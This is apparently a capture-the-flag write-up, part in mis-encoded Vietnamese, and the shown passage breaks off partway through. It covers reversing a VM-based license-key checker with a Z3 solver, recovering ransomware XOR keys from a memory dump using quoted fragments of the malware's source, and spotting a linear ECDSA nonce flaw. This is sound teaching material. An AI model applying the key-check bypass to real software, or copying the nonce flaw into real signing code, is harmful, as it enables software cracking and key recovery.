        case 2:
          local_3a8[bVar14] = local_3a8[bVar14] + (int)(short)uVar2;
          break;
        case 3:
          local_3a8[bVar14] = local_3a8[bVar14] + local_3a8[bVar1];
          break;
        case 4:
          local_3a8[bVar14] = local_3a8[bVar14] - (int)(short)uVar2;
          break;
        case 5:
          local_3a8[bVar14] = local_3a8[bVar14] - local_3a8[bVar1];
          break;
        case 6:
          local_3a8[bVar14] = local_3a8[bVar14] ^ local_3a8[bVar1];
          break;
        case 7:
          local_3a8[bVar14] = local_3a8[bVar14] | local_3a8[bVar1];
          break;
        case 8:
          local_3a8[bVar14] = local_3a8[bVar1] << ((byte)uVar2 & 0x1f);
          break;
        case 9:
          local_3a8[bVar14] = local_3a8[bVar1] >> ((byte)uVar2 & 0x1f);
          break;
        case 10:
          local_3a8[bVar14] = local_3a8[bVar14] & (uint)uVar2;
          break;
        case 0xb:
          uVar7 = 0;
          if ((ulong)local_3a8[bVar1] + (long)(short)uVar2 < 0x34) {
            uVar7 = (uint)local_138[(ulong)local_3a8[bVar1] + (long)(short)uVar2];
          }
          local_3a8[bVar14] = uVar7;
          break;
        case 0xc:
          if ((ulong)local_3a8[bVar1] + (long)(short)uVar2 < 0x100) {
            abStack_348[(ulong)local_3a8[bVar1] + (long)(short)uVar2] = (byte)local_3a8[bVar14];
          }
          break;
        case 0xd:
          uVar7 = 0;
          if ((ulong)local_3a8[bVar1] + (long)(short)uVar2 < 0x34) {
            uVar7 = (uint)abStack_348[(ulong)local_3a8[bVar1] + (long)(short)uVar2];
          }
          local_3a8[bVar14] = uVar7;
          break;
        case 0xe:
          uVar7 = 0;
          if ((ulong)local_3a8[bVar1] + (long)(short)uVar2 < 0x34) {
            uVar7 = (uint)(byte)(&DAT_001020e0)[(ulong)local_3a8[bVar1] + (long)(short)uVar2];
          }
          local_3a8[bVar14] = uVar7;
          break;
        case 0xf:
          bVar13 = local_3a8[bVar14] < (uint)(int)(short)uVar2;
          break;
        case 0x10:
          bVar13 = local_3a8[bVar14] == (int)(short)uVar2;
          break;
        case 0x11:
          bVar13 = local_3a8[bVar14] == local_3a8[bVar1];
          break;
        case 0x12:
          uVar9 = (ulong)(short)uVar2;
          goto LAB_00101343;
        case 0x13:
          if (!bVar13) break;
          uVar9 = (ulong)(short)uVar2;
          goto LAB_00101343;
        case 0x14:
          if (bVar13) break;
          uVar9 = (ulong)(short)uVar2;
          goto LAB_00101343;
        case 0x15:
          unaff_EBX = (uint)(uVar2 != 0);
          bVar3 = true;
          break;
        case 0x16:
          if (bVar3) {
            local_244 = unaff_EBX;
          }
          goto LAB_00101576;
        }
        uVar9 = uVar9 + 1;
LAB_00101343:
      } while (uVar9 < 0x9c);
      if (bVar3) {
        local_244 = unaff_EBX;
      }
LAB_00101576:
      if (local_244 == 0) {
        puts("[-] Invalid license key.");
        uVar6 = 1;
      }
      else {
        puts("[+] License valid.");
        uVar6 = 0;
      }
    }
    else {
      puts("[-] Invalid license key.");
      uVar6 = 1;
    }
  }
  if (local_30 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar6;
}
```
*   **Registers:** The `local_3a8` array and other local variables on the stack (e.g., `local_384`, `local_248`) serve as the VM's registers. We can tentatively name them `R0`, `R1`, `R2`, and so on.
*   **Program Counter (PC):** The `uVar9` variable within the `do-while` loop is the PC, determining which instruction to execute next.
*   **CPU/Interpreter:** The `do-while` loop contains a large `switch-case` block. This is the heart of the VM, where it "decodes" and "executes" each opcode.
*   **Memory/Bytecode (ROM):** The large data arrays starting from address `0x102120` constitute the program that the VM runs. Specifically:
    *   `DAT_00102120`: The array of **Opcodes**.
    *   `DAT_00102121`, `DAT_00102122`: Arrays containing the indices for the **Destination** and **Source** registers.
    *   `DAT_00102124`: The array containing **Immediate** values.
    *   `DAT_001020e0`: The **Secret Data** array used for comparison.

Each VM instruction has a 6-byte structure: `[Opcode] [Dst] [Src] [Padding] [Imm_low] [Imm_high]`

### **Reversing the Instruction Set**

Based on the `switch-case` block, we can reverse-engineer the functionality of the key opcodes:

| Opcode |   Mnemonic    |                              Function                               |
| :----: | :-----------: | :-----------------------------------------------------------------: |
| `0x0B` | `LOAD_INPUT`  |   `Reg[dst] = Input[Reg[src] + imm]` (Reads 1 byte from the key)    |
| `0x0E` | `LOAD_SECRET` | `Reg[dst] = Secret[Reg[src] + imm]` (Reads 1 byte from secret data) |
| `0x06` |     `XOR`     |                       `Reg[dst] ^= Reg[src]`                        |
| `0x03` |     `ADD`     |                       `Reg[dst] += Reg[src]`                        |
| `0x05` |     `SUB`     |                       `Reg[dst] -= Reg[src]`                        |
| `0x08` |     `SHL`     |              `Reg[dst] = Reg[src] << imm` (Shift Left)              |
| `0x09` |     `SHR`     |             `Reg[dst] = Reg[src] >> imm` (Shift Right)              |
| `0x11` | `CMP_EQ_REG`  |       Compares `Reg[dst] == Reg[src]`, sets the `bVar13` flag       |
| `0x13` | `JMP_IF_TRUE` |          Jumps to `PC = imm` if the `bVar13` flag is True           |
| `0x15` | `SET_RESULT`  |                      Marks success or failure                       |

The general logic of the VM is to take one byte from the input key, perform a series of transformations (XOR, ADD, SHIFT...), and finally compare the result with the corresponding byte in the Secret Data array.

### **Building the Solver and the Debugging Journey**

This is the most crucial part, explaining why the initial scripts failed to work.

#### **Problem 1: Corrupted Bytecode Data**
Initially, the provided data from Ghidra's **Listing View** was incomplete. This data is not a continuous byte stream; it is interspersed with:
*   Addresses (`00102120`, `00102121`, ...)
*   Labels (`DAT_...`)
*   Comments and incorrectly disassembled assembly code from Ghidra.

Manually copying and pasting this data corrupted the entire bytecode structure. Instructions were missing, and parameters (dst, src, imm) were misplaced.
&rArr; **Solution:** Use Ghidra's **"Copy Special..." &rarr; "Python Bytes"** feature to dump a clean, byte-for-byte accurate stream. This was the decisive turning point.

#### **Problem 2: Incorrect/Missing Register Initialization**
In the C code, several local variables are assigned initial values before the VM loop begins.
```c
local_3a8[0] = 0x34;  // R0
local_384 = 0xf337;   // R9
local_248 = 0xf337;   // R88
...
```
The first few scripts missed the initialization of `local_248` (i.e., `R88`). This register plays a critical role in calculating the indices for memory access. Without it, the VM would compute incorrect addresses, read zero values, and never perform the correct comparisons.
=> **Solution:** Carefully analyze the stack frame in Ghidra, calculate the offset of each `local_...` variable relative to `local_3a8` to determine the correct register index, and ensure all are fully initialized in the script.

#### **Problem 3: UNSAT - Conflicting Constraints**
After fixing the data and register initialization, the script ran and generated 52 constraints, but the result was **UNSAT**.
*   **Cause:** The index calculation logic within the VM is very complex. Even with all registers properly initialized, it still computed non-sequential memory access indices. For example, it might compare:
    *   `Transformed(Flag[0])` with `Secret[0]`
    *   `Transformed(Flag[1])` with `Secret[5]`
    *   `Transformed(Flag[0])` with `Secret[10]` (reusing `Flag[0]`)
    This creates mathematical contradictions that Z3 cannot solve (e.g., `X == 5` and `X == 10` is impossible).

=> **Final Solution ("Force-Feed"):** We realized that regardless of how complex the index logic is, the ultimate goal of a simple key validator is to perform a sequential comparison of `Input[i]` against `Secret[i]`. Therefore, we "hacked" our script:
1.  Completely ignore the VM's index calculation logic.
2.  Create our own counter variable, `force_index_counter`.
3.  Whenever a `LOAD_INPUT` or `LOAD_SECRET` instruction is encountered, use our counter as the index.
4.  Whenever a `CMP_EQ_REG` (opcode `0x11`) comparison is made, increment our counter.

This forces Z3 to solve a simpler but conceptually correct problem: `Transform(Flag[i]) == Secret[i]`.

### **Full Script**

The final solve script combines all the solutions above:
1.  Uses the **correct bytecode and secret_data** dumped from Ghidra.
2.  **Fully and accurately initializes** all critical registers (`R0`, `R9`, `R20`, `R22`, `R88`).
3.  Employs the **"Force-Feed Indexing"** technique to bypass the VM's complex/flawed index logic, ensuring a correct pairing of `Flag[i]` and `Secret[i]`.

When run, the script receives 52 logical, non-conflicting constraints, which Z3 quickly solves.

```python
import struct
from z3 import *

secret_bytes = b'\x3c\x6f\x53\x88\xd5\xf6\x00\x28\xb5\xbc\xab\x8b\x4d\xa6\xe2\x9a\x5b\x57\x10\xa4\x59\xd9\x56\x36\x01\x04\x51\xb0\xe1\xe2\x04\x0c\xe2\x35\xf8\x88\x6a\x2c\xcf\x29\xea\x2e\x73\x7e\x2a\xcc\xe9\x5f\x54\x35\x67\xd2'
bytecode = b'\x0f\x00\x00\x00\x04\x00\x13\x00\x00\x00\x05\x00\x01\x02\x00\x00\x00\x00\x04\x02\x00\x00\x04\x00\x12\x00\x00\x00\x06\x00\x00\x02\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x01\x04\x02\x00\x00\x00\x02\x04\x00\x00\x00\x00\x0b\x05\x04\x00\x00\x00\x08\x05\x05\x00\x00\x00\x07\x03\x05\x00\x00\x00\x01\x04\x02\x00\x00\x00\x02\x04\x00\x00\x01\x00\x0b\x05\x04\x00\x00\x00\x08\x05\x05\x00\x08\x00\x07\x03\x05\x00\x00\x00\x01\x04\x02\x00\x00\x00\x02\x04\x00\x00\x02\x00\x0b\x05\x04\x00\x00\x00\x08\x05\x05\x00\x10\x00\x07\x03\x05\x00\x00\x00\x01\x04\x02\x00\x00\x00\x02\x04\x00\x00\x03\x00\x0b\x05\x04\x00\x00\x00\x08\x05\x05\x00\x18\x00\x07\x03\x05\x00\x00\x00\x01\x04\x03\x00\x00\x00\x09\x04\x04\x00\x03\x00\x01\x05\x03\x00\x00\x00\x09\x05\x05\x00\x05\x00\x06\x04\x05\x00\x00\x00\x01\x05\x03\x00\x00\x00\x09\x05\x05\x00\x08\x00\x06\x04\x05\x00\x00\x00\x01\x05\x03\x00\x00\x00\x09\x05\x05\x00\x0c\x00\x06\x04\x05\x00\x00\x00\x0a\x04\x00\x00\xff\x00\x01\x05\x09\x00\x00\x00\x08\x05\x05\x00\x08\x00\x01\x09\x05\x00\x00\x00\x07\x09\x04\x00\x00\x00\x01\x0a\x09\x00\x00\x00\x01\x05\x00\x00\x00\x00\x05\x05\x01\x00\x00\x00\x10\x05\x00\x00\x00\x00\x13\x00\x00\x00\x8d\x00\x0f\x05\x00\x00\x04\x00\x13\x00\x00\x00\x34\x00\x00\x08\x00\x00\x04\x00\x12\x00\x00\x00\x35\x00\x01\x08\x05\x00\x00\x00\x01\x04\x09\x00\x00\x00\x09\x04\x04\x00\x03\x00\x01\x05\x09\x00\x00\x00\x09\x05\x05\x00\x05\x00\x06\x04\x05\x00\x00\x00\x01\x05\x09\x00\x00\x00\x09\x05\x05\x00\x08\x00\x06\x04\x05\x00\x00\x00\x01\x05\x09\x00\x00\x00\x09\x05\x05\x00\x0c\x00\x06\x04\x05\x00\x00\x00\x0a\x04\x00\x00\xff\x00\x01\x05\x09\x00\x00\x00\x08\x05\x05\x00\x08\x00\x01\x09\x05\x00\x00\x00\x07\x09\x04\x00\x00\x00\x01\x0a\x09\x00\x00\x00\x00\x0b\x00\x00\x00\x00\x0f\x08\x00\x00\x01\x00\x13\x00\x00\x00\x54\x00\x01\x04\x01\x00\x00\x00\x0b\x05\x04\x00\x00\x00\x01\x06\x0a\x00\x00\x00\x09\x06\x06\x00\x00\x00\x0a\x06\x00\x00\xff\x00\x01\x07\x05\x00\x00\x00\x06\x07\x06\x00\x00\x00\x0c\x07\x01\x00\x00\x00\x01\x06\x05\x00\x00\x00\x08\x06\x06\x00\x00\x00\x07\x0b\x06\x00\x00\x00\x0f\x08\x00\x00\x02\x00\x13\x00\x00\x00\x61\x00\x01\x04\x01\x00\x00\x00\x0b\x05\x04\x00\x01\x00\x01\x06\x0a\x00\x00\x00\x09\x06\x06\x00\x08\x00\x0a\x06\x00\x00\xff\x00\x01\x07\x05\x00\x00\x00\x06\x07\x06\x00\x00\x00\x0c\x07\x01\x00\x01\x00\x01\x06\x05\x00\x00\x00\x08\x06\x06\x00\x08\x00\x07\x0b\x06\x00\x00\x00\x0f\x08\x00\x00\x03\x00\x13\x00\x00\x00\x6e\x00\x01\x04\x01\x00\x00\x00\x0b\x05\x04\x00\x02\x00\x01\x06\x0a\x00\x00\x00\x09\x06\x06\x00\x10\x00\x0a\x06\x00\x00\xff\x00\x01\x07\x05\x00\x00\x00\x06\x07\x06\x00\x00\x00\x0c\x07\x01\x00\x02\x00\x01\x06\x05\x00\x00\x00\x08\x06\x06\x00\x10\x00\x07\x0b\x06\x00\x00\x00\x0f\x08\x00\x00\x04\x00\x13\x00\x00\x00\x7b\x00\x01\x04\x01\x00\x00\x00\x0b\x05\x04\x00\x03\x00\x01\x06\x0a\x00\x00\x00\x09\x06\x06\x00\x18\x00\x0a\x06\x00\x00\xff\x00\x01\x07\x05\x00\x00\x00\x06\x07\x06\x00\x00\x00\x0c\x07\x01\x00\x03\x00\x01\x06\x05\x00\x00\x00\x08\x06\x06\x00\x18\x00\x07\x0b\x06\x00\x00\x00\x01\x04\x0b\x00\x00\x00\x09\x04\x04\x00\x03\x00\x01\x05\x0b\x00\x00\x00\x09\x05\x05\x00\x05\x00\x06\x04\x05\x00\x00\x00\x01\x05\x0b\x00\x00\x00\x09\x05\x05\x00\x08\x00\x06\x04\x05\x00\x00\x00\x01\x05\x0b\x00\x00\x00\x09\x05\x05\x00\x0c\x00\x06\x04\x05\x00\x00\x00\x0a\x04\x00\x00\xff\x00\x01\x05\x09\x00\x00\x00\x08\x05\x05\x00\x08\x00\x01\x09\x05\x00\x00\x00\x07\x09\x04\x00\x00\x00\x02\x01\x00\x00\x04\x00\x12\x00\x00\x00\x2c\x00\x00\x0c\x00\x00\x00\x00\x01\x04\x00\x00\x00\x00\x05\x04\x0c\x00\x00\x00\x10\x04\x00\x00\x00\x00\x13\x00\x00\x00\x9a\x00\x0d\x05\x0c\x00\x00\x00\x0e\x06\x0c\x00\x00\x00\x11\x05\x06\x00\x00\x00\x14\x00\x00\x00\x98\x00\x02\x0c\x00\x00\x01\x00\x12\x00\x00\x00\x8e\x00\x15\x00\x00\x00\x00\x00\x16\x00\x00\x00\x00\x00\x15\x00\x00\x00\x01\x00\x16\x00\x00\x00\x00\x00'

# --- Z3 SOLVER ---
solver = Solver()
flag = [BitVec(f'f{i}', 8) for i in range(52)]
for c in flag:
    solver.add(c >= 32, c <= 126)

regs = {i: BitVecVal(0, 32) for i in range(100)}
vm_stack = {}
bVar13 = False

# === INIT REGISTERS ===
regs[0]  = BitVecVal(52, 32)
regs[9]  = BitVecVal(0xF337, 32)
regs[20] = BitVecVal(52, 32)
regs[22] = BitVecVal(52, 32)
regs[88] = BitVecVal(0xF337, 32)

def get_imm(offset):
    try:
        val = bytecode[offset+4] | (bytecode[offset+5] << 8)
        if val & 0x8000: val -= 0x10000
        return val
    except: return 0

# START AT PC = 0
pc_index = 0
steps = 0
constraints_added = 0

print("[*] Starting VM with correct bytecode...")

while pc_index * 6 < len(bytecode) and steps < 100000:
    steps += 1
    offset = pc_index * 6
    
    try:
        op = bytecode[offset]
        dst = bytecode[offset+1]
        src = bytecode[offset+2]
    except IndexError: break
        
    imm = get_imm(offset)
    next_pc = pc_index + 1

    # --- OPCODE LOGIC ---
    if op == 0: regs[dst] = BitVecVal(imm, 32)
    elif op == 1: regs[dst] = regs[src]
    elif op == 2: regs[dst] += imm
    elif op == 3: regs[dst] += regs[src]
    elif op == 4: regs[dst] -= imm
    elif op == 5: regs[dst] -= regs[src]
    elif op == 6: regs[dst] ^= regs[src]
    elif op == 7: regs[dst] |= regs[src]
    elif op == 8: regs[dst] = regs[src] << (imm & 0x1F)
    elif op == 9: regs[dst] = LShR(regs[src], (imm & 0x1F))
    elif op == 10: regs[dst] &= imm
    
    elif op == 11: # LOAD INPUT
        idx = simplify(regs[src] + imm).as_long()
        if 0 <= idx < 52:
            regs[dst] = ZeroExt(24, flag[idx])
        else:
            regs[dst] = BitVecVal(0, 32)
            
    elif op == 12: vm_stack[simplify(regs[src] + imm).as_long()] = regs[dst]
    elif op == 13: regs[dst] = vm_stack.get(simplify(regs[src] + imm).as_long(), BitVecVal(0, 32))
    
    elif op == 14: # LOAD SECRET
        idx = simplify(regs[src] + imm).as_long()
        if 0 <= idx < 52:
            regs[dst] = BitVecVal(secret_bytes[idx], 32)
        else:
            regs[dst] = BitVecVal(0, 32)
            
    elif op == 15: # CMP <
        concrete_val = simplify(regs[dst]).as_long()
        bVar13 = concrete_val < imm

    elif op == 16: # CMP ==
        concrete_val = simplify(regs[dst]).as_long()
        bVar13 = concrete_val == imm
        
    elif op == 17: # CMP REG == REG (CHECK FLAG)
        solver.add(regs[dst] == regs[src])
        bVar13 = True
        constraints_added += 1
        
    elif op == 18: next_pc = imm
    elif op == 19: 
        if bVar13: next_pc = imm
    elif op == 20: 
        if not bVar13: next_pc = imm
    
    elif op == 21: # Success
        print("[!] Reached Success State!")
        break

    pc_index = next_pc

print(f"[*] Execution finished. Constraints added: {constraints_added}")

if constraints_added > 0:
    if solver.check() == sat:
        m = solver.model()
        res = "".join([chr(m[c].as_long()) for c in flag])
        print(f"\n[+] Flag: {res}")
    else:
        print("[-] UNSAT")
else:
    print("[-] FAILED: No constraints generated.")
```

> **Flag:** `csd{I5_4ny7HiN9_R34LlY_R4Nd0m_1F_it5_bru73F0rc4B1e?}`
{: .prompt-flag}

---

## Syndiware

> Category: Forensics / Ransomware
{: .prompt-info}

**Th·ª≠ th√°ch:** Kh√¥i ph·ª•c c√°c file b·ªã m√£ h√≥a b·ªüi ransomware "Syndiware" v√† t√¨m flag ·∫©n gi·∫•u.
**File ƒë∆∞·ª£c cung c·∫•p:**
1.  `FreeRobux.py`: M√£ ngu·ªìn c·ªßa ransomware.
2.  `ransomware.DMP`: B·∫£n sao b·ªô nh·ªõ (Memory Dump) c·ªßa ti·∫øn tr√¨nh khi ransomware ƒëang ch·∫°y.
3.  `encrypted_files/`: C√°c file d·ªØ li·ªáu b·ªã m√£ h√≥a (`.enc`).

---

### Ph√¢n t√≠ch m√£ ƒë·ªôc (Source Code Analysis)

ƒê·∫ßu ti√™n, ta ƒë·ªçc file `FreeRobux.py` ƒë·ªÉ hi·ªÉu h√†nh vi c·ªßa m√£ ƒë·ªôc.

**ƒêi·ªÉm y·∫øu ch√≠ m·∫°ng:**
Ransomware n√†y s·ª≠ d·ª•ng th∆∞ vi·ªán `ctypes` ƒë·ªÉ t∆∞∆°ng t√°c v·ªõi Windows API nh·∫±m c·∫•p ph√°t b·ªô nh·ªõ.
```python
m_ptr = k32.VirtualAlloc(None, t_size, m|r, p) # C·∫•p ph√°t b·ªô nh·ªõ RAM
...
blob = f_bytes + k + marker # T·∫°o c·∫•u tr√∫c d·ªØ li·ªáu
ctypes.memmove(m_ptr + c_off, buff, len(blob)) # Ghi Key v√†o RAM
```

N√≥ l∆∞u tr·ªØ th√¥ng tin nh·∫°y c·∫£m v√†o RAM theo c·∫•u tr√∫c `blob` nh∆∞ng **kh√¥ng bao gi·ªù x√≥a** v√πng nh·ªõ n√†y sau khi d√πng. H∆°n n·ªØa, v√≤ng l·∫∑p `while True: time.sleep(3600)` gi·ªØ cho ti·∫øn tr√¨nh (v√† b·ªô nh·ªõ c·ªßa n√≥) lu√¥n t·ªìn t·∫°i cho ƒë·∫øn khi m√°y b·ªã t·∫Øt ho·∫∑c b·ªã dump RAM.

**C·∫•u tr√∫c d·ªØ li·ªáu trong RAM:**
D·ª±a v√†o code, ta x√°c ƒë·ªãnh ƒë∆∞·ª£c ƒë·ªãnh d·∫°ng "artifact" trong b·ªô nh·ªõ:
1.  `f_bytes`: T√™n file (60 bytes).
2.  `k`: Kh√≥a gi·∫£i m√£ (Key) (32 bytes) &rarr; **Th·ª© ta c·∫ßn t√¨m.**
3.  `marker`: D·∫•u hi·ªáu nh·∫≠n bi·∫øt `b'\xAA\xBB\xCC\xDD'` (4 bytes).

**Thu·∫≠t to√°n m√£ h√≥a:**
S·ª≠ d·ª•ng ph√©p XOR ƒë∆°n gi·∫£n: `Cipher = Plain XOR Key`.
Do ƒë√≥ ƒë·ªÉ gi·∫£i m√£: `Plain = Cipher XOR Key`.

---

### Memory Forensics (Tr√≠ch xu·∫•t Key t·ª´ DMP)

Ch√∫ng ta c·∫ßn t√¨m chu·ªói byte `\xAA\xBB\xCC\xDD` trong file `ransomware.DMP`. Khi t√¨m th·∫•y, ta s·∫Ω l√πi l·∫°i 32 bytes ƒë·ªÉ l·∫•y Key v√† l√πi ti·∫øp 60 bytes ƒë·ªÉ bi·∫øt Key ƒë√≥ thu·ªôc v·ªÅ file n√†o.

**Solver Script (Python):**
Script n√†y t·ª± ƒë·ªông qu√©t file DMP v√† gi·∫£i m√£ c√°c file.

```python
import os

# C·∫§U H√åNH D·ª∞A TR√äN PH√ÇN T√çCH SOURCE CODE
MARKER = b'\xAA\xBB\xCC\xDD' # D·∫•u hi·ªáu nh·∫≠n bi·∫øt
KEY_SIZE = 32                # K√≠ch th∆∞·ªõc Key
FILENAME_SIZE = 60           # K√≠ch th∆∞·ªõc t√™n file

def xor_process(data, key):
    """H√†m XOR t·ª´ m√£ ngu·ªìn g·ªëc d√πng ƒë·ªÉ gi·∫£i m√£"""
    if not key: return b''
    output = bytearray()
    key_len = len(key)
    for i, byte in enumerate(data):
        output.append(byte ^ key[i % key_len])
    return bytes(output)

def main():
    print("[*] B·∫Øt ƒë·∫ßu ph√¢n t√≠ch file ransomware.DMP...")
    
    try:
        with open("ransomware.DMP", "rb") as f:
            dump_data = f.read()
    except FileNotFoundError:
        print("[-] L·ªói: Kh√¥ng t√¨m th·∫•y file ransomware.DMP")
        return

    # T√¨m t·∫•t c·∫£ v·ªã tr√≠ c·ªßa Marker
    offsets = []
    start_search = 0
    while True:
        index = dump_data.find(MARKER, start_search)
        if index == -1: break
        offsets.append(index)
        start_search = index + 1

    print(f"[+] T√¨m th·∫•y {len(offsets)} d·∫•u hi·ªáu marker trong b·ªô nh·ªõ.")
    
    extracted_keys = {}

    # Tr√≠ch xu·∫•t Key v√† T√™n file d·ª±a tr√™n Offset
    for offset in offsets:
        # C·∫•u tr√∫c trong RAM: [Filename (60)] + [Key (32)] + [Marker (4)]
        
        # 1. L·∫•y Key (N·∫±m ngay tr∆∞·ªõc Marker)
        key_start = offset - KEY_SIZE
        key = dump_data[key_start : offset]
        
        # 2. L·∫•y T√™n File (N·∫±m ngay tr∆∞·ªõc Key)
        fname_start = key_start - FILENAME_SIZE
        fname_raw = dump_data[fname_start : key_start]
        
        # L√†m s·∫°ch t√™n file (x√≥a k√Ω t·ª± null \x00 do h√†m ljust t·∫°o ra)
        try:
            filename = fname_raw.replace(b'\x00', b'').decode('utf-8')
            extracted_keys[filename] = key
            print(f"    -> ƒê√£ kh√¥i ph·ª•c Key cho file: {filename}")
        except:
            print(f"    -> [!] L·ªói khi decode t√™n file t·∫°i offset {offset}")

    # Ti·∫øn h√†nh gi·∫£i m√£ c√°c file trong th∆∞ m·ª•c encrypted_files
    enc_dir = "encrypted_files"
    if not os.path.exists(enc_dir):
        print(f"[-] Kh√¥ng t√¨m th·∫•y th∆∞ m·ª•c {enc_dir}")
        return

    print("\n[*] B·∫Øt ƒë·∫ßu gi·∫£i m√£ file...")
    for filename in os.listdir(enc_dir):
        if filename.endswith(".enc"):
            original_name = filename[:-4] # B·ªè ƒëu√¥i .enc
            
            if original_name in extracted_keys:
                key = extracted_keys[original_name]
                
                with open(os.path.join(enc_dir, filename), "rb") as f_enc:
                    cipher_data = f_enc.read()
                
                plain_data = xor_process(cipher_data, key)
                
                # L∆∞u file ƒë√£ gi·∫£i m√£
                output_name = "DECRYPTED_" + original_name
                with open(output_name, "wb") as f_out:
                    f_out.write(plain_data)
                
                print(f"[SUCCESS] ƒê√£ gi·∫£i m√£: {output_name}")
            else:
                print(f"[FAIL] Kh√¥ng t√¨m th·∫•y key cho file: {filename}")

if __name__ == "__main__":
    main()
```

---

### Ph√¢n t√≠ch file ƒë√£ gi·∫£i m√£ (Data Decoding)

Sau khi ch·∫°y script tr√™n, ta thu ƒë∆∞·ª£c 3 file:
1.  `DECRYPTED_ourking.png`: M·ªôt b·ª©c ·∫£nh (c√≥ th·ªÉ ch·ª©a hint ho·∫∑c g√¢y nhi·ªÖu).
2.  `DECRYPTED_Elf 41's Diary.pdf`: Nh·∫≠t k√Ω s·ªë 1.
3.  `DECRYPTED_Elf67‚Äôs Diary.pdf`: Nh·∫≠t k√Ω s·ªë 2.

Khi m·ªü file `DECRYPTED_Elf67‚Äôs Diary.pdf`, n·ªôi dung b√™n trong tr√¥ng nh∆∞ sau:
```
67667667 67776766 66766666 67776777...
```
To√†n b·ªô vƒÉn b·∫£n ch·ªâ g·ªìm c√°c con s·ªë `6` v√† `7`.

**Nh·∫≠n ƒë·ªãnh:** ƒê√¢y l√† m√£ **Nh·ªã ph√¢n (Binary)** ƒë√£ b·ªã l√†m m·ªù (Obfuscated).
*   S·ªë `6` ƒë·∫°i di·ªán cho bit `0`.
*   S·ªë `7` ƒë·∫°i di·ªán cho bit `1`.
*   (Ho·∫∑c ng∆∞·ª£c l·∫°i, nh∆∞ng th·ª≠ 6=0, 7=1 th∆∞·ªùng ra m√£ ASCII ƒë·ªçc ƒë∆∞·ª£c).

V√≠ d·ª• kh·ªëi ƒë·∫ßu ti√™n: `67667667`
&rarr; Thay 6=0, 7=1: `01001001`
&rarr; ƒê·ªïi sang Decimal: `73`
&rarr; Tra b·∫£ng ASCII: Ch·ªØ **`I`**.

**Script gi·∫£i m√£ n·ªôi dung Nh·∫≠t k√Ω:**

```python
import binascii

def decode_diary(filename):
    print(f"[*] ƒêang gi·∫£i m√£ {filename}...")
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read()
    except FileNotFoundError:
        print("[-] Kh√¥ng t√¨m th·∫•y file. H√£y t·∫°o file text ch·ª©a n·ªôi dung s·ªë.")
        return

    # X√≥a c√°c k√Ω t·ª± kh√¥ng ph·∫£i s·ªë v√† kho·∫£ng tr·∫Øng th·ª´a
    content = content.replace('\n', ' ').replace('\r', '')
    
    # T√°ch th√†nh c√°c kh·ªëi 8 s·ªë
    blocks = content.split(' ')
    decoded_text = ""

    for block in blocks:
        if len(block) < 8: continue # B·ªè qua c√°c kh·ªëi l·ªói
        
        # X√°c ƒë·ªãnh lo·∫°i m√£ h√≥a d·ª±a tr√™n k√Ω t·ª± ƒë·∫ßu
        binary_str = ""
        if '6' in block or '7' in block:
            # Elf67: 6=0, 7=1
            binary_str = block.replace('6', '0').replace('7', '1')
        elif '4' in block or '1' in block:
            # Elf41: 4=0, 1=1
            binary_str = block.replace('4', '0').replace('1', '1')
        
        # Chuy·ªÉn nh·ªã ph√¢n sang k√Ω t·ª±
        try:
            char_code = int(binary_str, 2)
            decoded_text += chr(char_code)
        except:
            pass

    print("\n--- N·ªòI DUNG GI·∫¢I M√É ---\n")
    print(decoded_text)
    print("\n------------------------\n")
    
    # T√¨m ki·∫øm Flag trong n·ªôi dung
    if "csd" in decoded_text or "flag" in decoded_text.lower():
        index = decoded_text.lower().find("flag")
        if index == -1: index = decoded_text.find("CTF")
        start = max(0, index - 20)
        end = min(len(decoded_text), index + 100)
        print(f"snippet: ...{decoded_text[start:end]}...")

if __name__ == "__main__":
    decode_diary("diary_67.txt")
```

---

> **Flag:** `csd{73rr1bl3_R4ns0m3w3r3_4l50_67_15_d34d}`
{: .prompt-flag}

---

### B√†i h·ªçc r√∫t ra (Key Takeaways)

1.  **Memory Persistence:** Malware (ƒë·∫∑c bi·ªát l√† lo·∫°i vi·∫øt v·ªôi ho·∫∑c tr√¨nh ƒë·ªô th·∫•p) th∆∞·ªùng qu√™n x√≥a (zero-out) c√°c d·ªØ li·ªáu nh·∫°y c·∫£m nh∆∞ Key m√£ h√≥a trong b·ªô nh·ªõ RAM sau khi s·ª≠ d·ª•ng.
2.  **Forensics Workflow:**
    *   Ph√¢n t√≠ch Static (Code) &rarr; Hi·ªÉu c·∫•u tr√∫c d·ªØ li·ªáu.
    *   Ph√¢n t√≠ch Memory (DMP) &rarr; T√¨m d·ªØ li·ªáu d·ª±a tr√™n c·∫•u tr√∫c ƒë√£ hi·ªÉu.
    *   Gi·∫£i m√£ (Decrypt) &rarr; Kh√¥i ph·ª•c file.
    *   Gi·∫£i m√£ n·ªôi dung (Decode) &rarr; T·ª´ Binary/Hex/Base64 sang Plaintext.
3.  **Obfuscation:** C√°c d·∫°ng m√£ h√≥a vƒÉn b·∫£n ƒë∆°n gi·∫£n (nh∆∞ thay 0/1 b·∫±ng s·ªë kh√°c) r·∫•t hay g·∫∑p trong CTF ƒë·ªÉ gi·∫•u flag.

---

## Re-Key-very
> **Category:** Cryptography / ECDSA
{: .prompt-info}

### Ph√¢n t√≠ch m√£ ngu·ªìn (Source Code Analysis)

Khi ƒë·ªçc file `gen.py`, ta t·∫≠p trung v√†o quy tr√¨nh k√Ω (signing process).

1.  **Kh·ªüi t·∫°o kh√≥a:**
    ```python
    key = open('flag.txt', 'rb').read()
    d = int.from_bytes(key, 'big')
    d = (d % (n - 1)) + 1  # L∆∞u √Ω d√≤ng n√†y!
    ```
    Kh√≥a b√≠ m·∫≠t `d` ƒë∆∞·ª£c t·∫°o t·ª´ n·ªôi dung file flag, sau ƒë√≥ **ƒë∆∞·ª£c c·ªông th√™m 1** (sau khi mod). ƒê√¢y l√† chi ti·∫øt quan tr·ªçng khi·∫øn flag c·ªßa b·∫°n b·ªã l·ªách 1 k√Ω t·ª± l√∫c ƒë·∫ßu.

2.  **L·ªói b·∫£o m·∫≠t (The Vulnerability):**
    ```python
    k = random.randint(0, n - 1) # Nonce k ban ƒë·∫ßu ng·∫´u nhi√™n
    for m in msgs:
        r, s = sign(m, k, d)
        # ...
        k += 1  # <--- L·ªñI NGHI√äM TR·ªåNG (Linear Nonce Relation)
    ```
